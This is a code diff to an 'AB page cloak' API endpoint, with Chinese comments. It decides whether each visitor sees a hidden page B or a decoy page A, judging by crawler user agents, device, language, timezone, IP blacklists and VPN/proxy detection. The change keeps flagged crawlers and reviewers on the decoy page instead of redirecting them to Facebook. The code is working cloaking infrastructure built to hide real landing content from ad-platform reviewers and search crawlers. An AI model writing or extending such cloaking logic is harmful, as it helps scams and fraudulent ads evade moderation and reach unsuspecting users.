@@ -1,7 +1,7 @@
 // POST /api/ab-cloak — AB页斗篷判定（公开，无鉴权）
-// A页守卫脚本（根目录 ab-cloak.js）在页面加载时调用此接口，
+// A页守卫脚本（根目录 ab-ck.js）在页面加载时调用此接口，
 // 服务端综合：白名单 → 爬虫UA → 设备 → 语言 → 时区 → IP黑名单 → VPN/代理(ipinfo)，
-// 返回 { redirect }：真实用户跳 b_url，爬虫/被屏蔽跳 fallback_url，无配置/未开通则 redirect=null。
+// 返回 { redirect }：真实用户跳 b_url，爬虫/被屏蔽（命中规则）留在 A 页（redirect=null），无配置/未开通则 redirect=null。
 // 与既有斗篷(functions/api/cloak.js)完全独立，不复用其接口。
 
 const jsonHeaders = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' };
@@ -151,14 +151,13 @@ async function resolveConfig(env, rawSite) {
     var c = candidates[i];
     if (seen[c]) continue; seen[c] = 1;
     try {
-      var row = await env.DB.prepare('SELECT a_url, username, enabled, b_url, fallback_url, whitelist_ips, rules FROM ab_configs WHERE a_url = ?1').bind(c).first();
+      var row = await env.DB.prepare('SELECT a_url, username, enabled, b_url, whitelist_ips, rules FROM ab_configs WHERE a_url = ?1').bind(c).first();
       if (row) {
         config = {
           a_url: row.a_url,
           username: row.username || '',
           enabled: row.enabled,
           b_url: row.b_url || '',
-          fallback_url: row.fallback_url || 'https://www.facebook.com',
           whitelist_ips: parseJson(row.whitelist_ips, []),
           rules: parseJson(row.rules, {})
         };
@@ -204,7 +203,7 @@ export async function onRequest(context) {
 
     // 无配置 / 关闭 / 账号无权限 → 不跳转（fail-open，避免误伤）
     if (resolved.permOff || !config || (config.enabled !== 1 && config.enabled !== true)) {
-      return new Response(JSON.stringify({ redirect: null, passed: true, disabled: !config, permOff: resolved.permOff }), { headers: jsonHeaders });
+      return new Response(JSON.stringify({ redirect: null, passed: true, disabled: !config, permOff: resolved.permOff, enabled: config ? config.enabled : null }), { headers: jsonHeaders });
     }
 
     var client = body.client || {};
@@ -228,8 +227,8 @@ export async function onRequest(context) {
     }
 
     var passed = triggered.length === 0;
-    // 真实用户 → B 页；爬虫/被屏蔽 → 不符合规则跳转地址
-    var redirect = passed ? (config.b_url || null) : (config.fallback_url || 'https://www.facebook.com');
+    // 真实用户 → B 页；爬虫/被屏蔽（命中规则）→ 留在 A 页（不跳转）
+    var redirect = passed ? (config.b_url || null) : null;
 
     return new Response(JSON.stringify({ redirect: redirect, passed: passed, triggered: triggered, whitelisted: whitelisted, _dbg: { a_url: config.a_url, username: config.username, device: device, ip: ip } }), { headers: jsonHeaders });
   } catch (e) {
